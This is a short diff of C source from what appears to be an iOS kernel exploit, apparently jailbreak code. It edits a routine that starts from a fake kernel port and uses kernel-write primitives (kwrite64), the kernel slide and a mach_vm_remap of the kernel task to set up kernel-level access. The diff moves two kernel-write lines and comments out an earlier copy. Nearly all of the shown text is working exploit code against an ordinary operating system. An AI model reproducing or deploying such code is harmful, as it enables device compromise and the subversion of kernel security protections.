@@ -472,6 +472,12 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     LOG("kern_task_addr: %llx", kern_task_addr);
 
+	/*
+	// setup kernel base and slide for post
+	kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_addr,offsets->constant.kernel_image_base + kslide);
+	kwrite64(kern_task_addr + offsets->struct_offsets.task_all_image_info_size,kslide);
+	*/
+
 	mach_vm_address_t remap_addr = 0x0;
     vm_prot_t cur = 0x0, max = 0x0;
     ret = offsets->userland_funcs.mach_vm_remap(maps[1], &remap_addr, offsets->struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
@@ -487,10 +493,6 @@ void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobje
 
     offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[0]);
     offsets->userland_funcs.mach_port_destroy(offsets->userland_funcs.mach_task_self(), maps[1]);
-
-	// setup kernel base and slide for post
-	kwrite64(remap_addr + offsets->struct_offsets.task_all_image_info_addr,offsets->constant.kernel_image_base + kslide);
-	kwrite64(remap_addr + offsets->struct_offsets.task_all_image_info_size,kslide);
 
     // remap must cover the entire struct and be page aligned 
     uint64_t remap_start = remap_addr & ~(pgsize - 1);
